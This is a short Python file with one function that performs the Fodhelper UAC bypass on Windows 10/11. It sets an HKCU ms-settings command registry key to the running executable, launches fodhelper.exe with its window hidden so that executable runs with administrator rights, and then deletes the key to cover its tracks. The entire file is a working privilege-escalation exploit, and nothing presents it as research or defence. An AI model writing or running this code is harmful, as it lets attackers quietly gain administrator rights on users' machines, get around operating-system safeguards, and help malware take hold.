import os, sys, subprocess, winreg, time

def run_uac_bypass():
    """
    Attempts to bypass UAC using the Fodhelper technique.
    Works on Windows 10/11.
    """
    def _execute():
        try:
            # 1. Define the registry key and command
            # We want to run the current EXE with admin privileges
            exe_path = sys.executable
            reg_key = r"Software\Classes\ms-settings\Shell\Open\command"
            
            # 2. Create the key
            winreg.CreateKey(winreg.HKEY_CURRENT_USER, reg_key)
            
            # 3. Set the (Default) value to our EXE and the DelegateExecute to empty string
            with winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_key, 0, winreg.KEY_WRITE) as key:
                winreg.SetValueEx(key, "", 0, winreg.REG_SZ, exe_path)
                winreg.SetValueEx(key, "DelegateExecute", 0, winreg.REG_SZ, "")
            
            # 4. Trigger fodhelper.exe
            subprocess.Popen("C:\\Windows\\System32\\fodhelper.exe", creationflags=subprocess.CREATE_NO_WINDOW)
            
            # 5. Clean up after a delay
            time.sleep(5)
            winreg.DeleteKey(winreg.HKEY_CURRENT_USER, reg_key)
            
            return True
        except Exception as e:
            print(f"[UAC] Bypass failed: {e}")
            return False

    return _execute()
